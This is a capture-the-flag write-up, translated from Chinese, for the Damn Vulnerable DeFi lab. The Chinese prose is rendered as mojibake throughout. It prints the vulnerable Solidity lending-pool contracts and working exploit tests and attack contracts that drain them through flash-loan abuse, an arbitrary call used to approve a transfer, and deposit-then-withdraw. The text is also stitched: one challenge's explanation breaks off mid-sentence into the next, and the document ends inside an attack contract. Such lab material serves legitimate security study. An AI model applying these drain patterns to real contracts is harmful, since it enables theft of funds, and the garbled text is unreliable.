# Damn Vulnerable DeFi é¢˜è§£
|
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
## å‰è¨€
[OpenZeppelin](https://openzeppelin.com/) è®¾è®¡çš„å…³äº DeFi
çš„å…«é“é¢˜ç›®ï¼Œåšèµ·æ¥æŒºæœ‰æ„æ€çš„ï¼Œç‰¹å®šåˆ†äº«ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹ï¼ŒæŒ‘æˆ˜åœ°å€ï¼š
###  DeFi
DeFi æ˜¯ decentralized finance çš„ç¼©å†™ï¼Œæ‰€è°“å»ä¸­å¿ƒåŒ–é‡‘èï¼Œæ˜¯æŒ‡æ—¨åœ¨ç ´åé‡‘èä¸­é—´æœºæ„çš„å„ç§åŠ å¯†è´§å¸æˆ–åŒºå—é“¾é‡‘èåº”ç”¨çš„æ€»ç§°ã€‚
## è§£é¢˜æµç¨‹
  1. å…‹éš†[ä»“åº“](https://github.com/OpenZeppelin/damn-vulnerable-defi/tree/v1.0.0)
  2. ä½¿ç”¨ `npm install` å®‰è£…ä¾èµ–
  3. åœ¨ test æ–‡ä»¶å¤¹é‡Œï¼Œæ¯ä¸ªä¸åŒçš„é¢˜ç›®æ–‡ä»¶å¤¹é‡Œæœ‰ç€å¯¹åº”çš„ `*.challenge.js`ï¼Œæˆ‘ä»¬éœ€è¦å®Œæˆé‡Œé¢ç•™ç©ºçš„ä»£ç 
  4. è¿è¡Œ `npm run challenge-name` æµ‹è¯•æˆ‘ä»¬æ„é€ çš„ exploit èƒ½å¦æˆåŠŸåˆ©ç”¨
## Unstoppable
> Thereâ€™s a lending pool with a million DVT tokens in balance, offering flash
> loans for free.
>
> If only there was a way to attack and stop the pool from offering flash
> loans â€¦
>
> You start with 100 DVT tokens in balance.
ç¬¬ä¸€é“å±äºç­¾åˆ°éš¾åº¦ï¼Œä¸»è¦è®©ç©å®¶ç†Ÿæ‚‰å¦‚ä½•å®Œæˆæ“ä½œã€‚ä¸‹é¢æ¥çœ‹æä¾›å€Ÿè´·åŠŸèƒ½çš„åˆçº¦ï¼š
    contract UnstoppableLender is ReentrancyGuard {
        using SafeMath for uint256;
        IERC20 public damnValuableToken;
        uint256 public poolBalance;
        constructor(address tokenAddress) public {
            require(tokenAddress != address(0), "Token address cannot be zero");
            damnValuableToken = IERC20(tokenAddress);
        }
        function depositTokens(uint256 amount) external nonReentrant {
            require(amount > 0, "Must deposit at least one token");
            // Transfer token from sender. Sender must have first approved them.
            damnValuableToken.transferFrom(msg.sender, address(this), amount);
            poolBalance = poolBalance.add(amount);
        }
        function flashLoan(uint256 borrowAmount) external nonReentrant {
            require(borrowAmount > 0, "Must borrow at least one token");
            uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
            require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
            // Ensured by the protocol via the `depositTokens` function
            assert(poolBalance == balanceBefore);
            damnValuableToken.transfer(msg.sender, borrowAmount);
            IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
            uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
            require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
        }
    }
å¯ä»¥çœ‹åˆ°æ¡ä»¶ `assert(poolBalance == balanceBefore);` è®¾è®¡çš„éå¸¸å¥‡æ€ªï¼Œç‰¹åˆ«æ˜¯ `poolBalance` åªä¼šåœ¨
`depositTokens()` è¢«è°ƒç”¨çš„æ—¶å€™å¢åŠ ï¼Œè¿™æ„å‘³ç€å¦‚æœé€šè¿‡ ERC20 æ ‡å‡†çš„ transfer å°† token è½¬ç§»åˆ° pool
ä¸Šæ—¶ï¼Œ`balanceBefore` ä¼šå¢åŠ ï¼Œå› ä¸ºä½™é¢å¢åŠ äº†ï¼Œä½† `poolBalance` ä¸ä¼šå¢åŠ ï¼Œ `poolBalance  Thereâ€™s a lending pool offering quite expensive flash loans of Ether, which
> has 1000 ETH in balance.
>
> You also see that a user has deployed a contract with 10 ETH in balance,
> capable of interacting with the lending pool and receiveing flash loans of
> ETH.
>
> Drain all ETH funds from the userâ€™s contract. Doing it in a single
> transaction is a big plus ğŸ˜‰
æœ¬é¢˜è¦æ±‚æˆ‘ä»¬æ¸…ç©ºç”¨æˆ·åˆçº¦ä¸­çš„å…¨éƒ¨ä½™é¢ï¼Œé˜…è¯» `NaiveReceiverLenderPool` çš„æºä»£ç ï¼š
    contract NaiveReceiverLenderPool is ReentrancyGuard {
        using SafeMath for uint256;
        using Address for address;
        uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
        function fixedFee() external pure returns (uint256) {
            return FIXED_FEE;
        }
        function flashLoan(address payable borrower, uint256 borrowAmount) external nonReentrant {
            uint256 balanceBefore = address(this).balance;
            require(balanceBefore >= borrowAmount, "Not enough ETH in pool");
            require(address(borrower).isContract(), "Borrower must be a deployed contract");
            // Transfer ETH and handle control to receiver
            (bool success, ) = borrower.call{value: borrowAmount}(
                abi.encodeWithSignature(
                    "receiveEther(uint256)",
                    FIXED_FEE
                )
            );
            require(success, "External call failed");
            require(
                address(this).balance >= balanceBefore.add(FIXED_FEE),
                "Flash loan hasn't been paid back"
            );
        }
        // Allow deposits of ETH
        receive () external payable {}
    }
å¾ˆæ˜æ˜¾è°ƒç”¨ä¸€æ¬¡ `flashLoan()` å°±å¯ä»¥è®©åˆçº¦è´¦æˆ·å‡å°‘ 1 ETHï¼Œé‚£ä¹ˆæŒç»­è°ƒç”¨å³å¯é¡ºåˆ©æ¸…ç©ºåˆçº¦ï¼š
    it('Exploit', async function () {
        while(await balance.current(this.receiver.address) > 0) {
            await this.pool.flashLoan(this.receiver.address, 0);
        }
    });
ä¸è¿‡å•æ¬¡äº¤æ˜“çš„æ–¹æ³•éœ€è¦æ›´é•¿çš„æ—¶é—´ï¼Œæ›´ç®€å•çš„æ–¹æ³•æ˜¯ç›´æ¥å†™ä¸€ä¸ªæ”»å‡»çš„åˆçº¦å¹¶è°ƒç”¨ï¼š
    pragma solidity ^0.6.0;
    contract AttackReceiver {
        function attack(address payable pool, address payable receiver) public {
            while(receiver.balance > 0) {
                (bool success, ) = pool.call(
                    abi.encodeWithSignature(
                        "flashLoan(address,uint256)",
                        receiver,
                        0
                    )
                );
                require(success, "External call failed");
            }
        }
    }
    const AttackReceiver = contract.fromArtifact('AttackReceiver');
    it('Exploit', async function () {
        const attack = await AttackReceiver.new();
        await attack.attack(this.pool.address, this.receiver.address, { from: attacker });
    }
## Truster
> More and more lending pools are offering flash loans. In this case, a new
> pool has launched that is offering flash loans of DVT tokens for free.
>
> Currently the pool has 1 million DVT tokens in balance. And you have
> nothing.
>
> But donâ€™t worry, you might be able to steal them all from the pool.
æœ¬é¢˜è¦æ±‚è·å¾—è´·æ¬¾æ± ä¸­çš„å…¨éƒ¨ä½™é¢ï¼Œåˆçº¦æœ¬èº«å¾ˆç®€å•ï¼š
    pragma solidity ^0.6.0;
    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
    contract TrusterLenderPool is ReentrancyGuard {
        IERC20 public damnValuableToken;
        constructor (address tokenAddress) public {
            damnValuableToken = IERC20(tokenAddress);
        }
        function flashLoan(
            uint256 borrowAmount,
            address borrower,
            address target,
            bytes calldata data
        )
            external
            nonReentrant
        {
            uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
            require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
            damnValuableToken.transfer(borrower, borrowAmount);
            (bool success, ) = target.call(data);
            require(success, "External call failed");
            uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
            require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
        }
    }
å¯ä»¥çœ‹åˆ°åˆçº¦ä½¿ç”¨äº† call æ¥å®ç°ä»»æ„äº¤æ˜“çš„è°ƒç”¨ï¼Œä½†è¿™ä¹Ÿæ„å‘³ç€æå¤§çš„å®‰å…¨éšæ‚£ï¼Œæˆ‘ä»¬å¯ä»¥è®©åˆçº¦æ‰§è¡Œä»»æ„çš„æ“ä½œï¼Œæ¯”å¦‚è°ƒç”¨ `approve()`
å‡½æ•°ï¼Œå…è®¸æˆ‘ä»¬ä»åˆçº¦è´¦æˆ·ä¸Šè¿›è¡Œè½¬è´¦ï¼Œè¿™é‡Œä¸ç›´æ¥è°ƒç”¨ `tranfser()` å‡½æ•°çš„åŸå› æ˜¯è°ƒç”¨å®Œæˆåä¸èƒ½æ»¡è¶³ `balanceAfter >=
balanceBefore` çš„è¦æ±‚ã€‚
è§£å†³çš„æ€è·¯ä¹Ÿéå¸¸ç›´æ¥ï¼Œåˆ©ç”¨ abi ç¼–ç  data åï¼Œåƒè´·æ¬¾æ± è°ƒç”¨ `flashLoan()` ç§Ÿå€Ÿ 0 å…ƒï¼Œç„¶åç­‰å¾…åˆçº¦æ‰§è¡Œå®Œæˆ `approve()`
å‡½æ•°ï¼Œç„¶åç›´æ¥ä» token å¤„å–èµ°ç›¸åº”çš„é‡‘é¢ï¼š
    it('Exploit', async function () {
        const data = web3.eth.abi.encodeFunctionCall({
            name: 'approve',
            type: 'function',
            inputs: [{
                type: 'address',
                name: 'spender'
            },{
                type: 'uint256',
                name: 'amount'
            }]
        }, [attacker, TOKENS_IN_POOL.toString()]); 
        await this.pool.flashLoan(0, attacker, this.token.address, data);
        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker });
    });
## Side entrance
> A surprisingly simple lending pool allows anyone to deposit ETH, and
> withdraw it at any point in time.
>
> This very simple lending pool has 1000 ETH in balance already, and is
> offering free flash loans using the deposited ETH to promote their system.
>
> You must steal all ETH from the lending pool.
æœ¬é¢˜è€ƒç‚¹åŒæ ·æ˜¯ä»è´·æ¬¾æ± ä¸­æèµ°å…¨éƒ¨çš„ tokenï¼Œä½†ä¸åŒäºä¸Šé¢˜çš„ç›´æ¥æä¾› `call` è¿›è¡Œè°ƒç”¨ï¼Œæœ¬é¢˜é™å®šäº†åªèƒ½è°ƒç”¨ receiver çš„
`execute()` å‡½æ•°ï¼š
    interface IFlashLoanEtherReceiver {
        function execute() external payable;
    }
    contract SideEntranceLenderPool {
        using Address for address payable;
        mapping (address => uint256) private balances;
        function deposit() external payable {
            balances[msg.sender] += msg.value;
        }
        function withdraw() external {
            uint256 amountToWithdraw = balances[msg.sender];
            balances[msg.sender] = 0;
            msg.sender.sendValue(amountToWithdraw);
        }
        function flashLoan(uint256 amount) external {
            uint256 balanceBefore = address(this).balance;
            require(balanceBefore >= amount, "Not enough ETH in balance");
            IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
            require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
        }
    }
ä½†ä»”ç»†å®¡è®¡æºä»£ç ä¹‹åå‘ç°æœ¬é¢˜çš„æ¼æ´ä¹Ÿéå¸¸æ˜æ˜¾ï¼Œå¦‚æœä»è´·æ¬¾æ± ä¸­å€Ÿå‡ºä¸€å®šé‡çš„ ETH å¹¶é€šè¿‡ `deposit()` å‡½æ•°å°†è¿™éƒ¨åˆ† ETH å­˜å…¥ï¼Œé‚£ä¹ˆåœ¨æ»¡è¶³
`address(this).balance >= balanceBefore` çš„åŒæ—¶ï¼Œ`balances[msg.sender]`
ä¹Ÿä¼šå¢åŠ ã€‚ç„¶åæˆ‘ä»¬å†é€šè¿‡ `withdraw()` å‡½æ•°å–å‡ºï¼Œå³å¯é¡ºåˆ©æç©ºè´·æ¬¾æ± ä¸­çš„å†…éƒ¨é‡‘é¢ã€‚æ ¹æ®é€»è¾‘æ„é€ æ”»å‡»åˆçº¦ï¼š
    interface IFlashLoanEtherReceiver {
        function execute() external payable;
    }
    interface ISideEntranceLenderPool {
        function deposit() external payable;
        function withdraw() external;
        function flashLoan(uint256 amount) external;
    }
    contract AttackSideEntrance is IFlashLoanEtherReceiver {
        using Address for address payable;
        ISideEntranceLenderPool pool;
        function attack(ISideEntranceLenderPool _pool) public {
            pool = _pool;
            pool.flashLoan(address(_pool).balance);
            pool.withdraw();
            msg.sender.sendValue(address(this).balance);
        }
        function execute() external payable override {